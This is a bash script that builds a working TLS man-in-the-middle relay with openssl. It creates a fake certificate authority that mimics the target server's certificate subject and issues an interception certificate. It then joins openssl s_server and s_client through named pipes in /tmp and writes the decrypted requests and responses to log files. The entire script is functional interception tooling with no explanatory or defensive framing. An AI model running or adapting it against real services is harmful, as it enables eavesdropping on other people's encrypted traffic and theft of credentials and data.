#!/usr/bin/env bash
#xor007

function usage(){
    echo "$0 <listen_port> <destination_ip:destination_port> <start|stop|setup>  <private_key_bundle> (requires openssl command)"
}

private_key_bundle=$4
listen_port=$1
dst_socket=$2
cmd=$3

tmp_dir="/tmp/"

if [ "$private_key_bundle" == "" ]
then
    private_key_bundle="mitm_bundle.crt"
fi

function start(){
    mkdir -p $tmp_dir
    mkfifo $tmp_dir/mitm_request $tmp_dir/mitm_response
    nohup openssl s_server -quiet -CAfile server.crt -cert $private_key_bundle -accept $listen_port < $tmp_dir/mitm_response | tee -a $tmp_dir/mitm_request > responses.log &
    nohup openssl s_client -quiet -connect $dst_socket < $tmp_dir/mitm_request | tee -a $tmp_dir/mitm_response > requests.log &
    echo "to test: openssl s_client -CAfile server.crt -verify 5 -showcerts -connect localhost:$listen_port"
}

function stop(){
    kill -9 $(lsof $tmp_dir/mitm_request $tmp_dir/mitm_response | awk '/FIFO/ {print $2}' | xargs)
    rm -f $tmp_dir/mitm_request $tmp_dir/mitm_response
}

function setup(){
    certif=$(openssl s_client -showcerts -connect $dst_socket  2>&1 <<  EOF
EOF
)
    in_subj=$(echo $certif | perl -ne 'if(/s:(.+).i:/){print "$1";}')
    cn=$(echo $in_subj | awk -F\/ '{print $NF}')
    echo "the incoming Subject is: $in_subj and common name is $cn ..."

    out_sub=$(echo $in_subj | sed -e's/'$cn'/'CN=$(hostname)'/' )
    echo "the outgoing Subject is: $out_sub ..."

    echo "Generating and signing private key for fake CA..."
    openssl req -nodes -newkey rsa:2048 -keyout server.key -out server.csr -subj "$in_subj"
    openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt

    echo "Generating and signing private key for Mitm..."
    openssl req -nodes -newkey rsa:2048 -keyout mitm.key -out mitm.csr -subj "$out_sub"
    openssl x509 -req -days 365 -in mitm.csr -CA server.crt -CAkey server.key -CAcreateserial -out mitm.crt
    cat mitm.key mitm.crt > $private_key_bundle
}

case "$cmd" in
    start)
        start
        ;;
    stop)
        stop
        ;;
    setup)
        setup
        ;;
    *)
        usage
        exit 3
esac
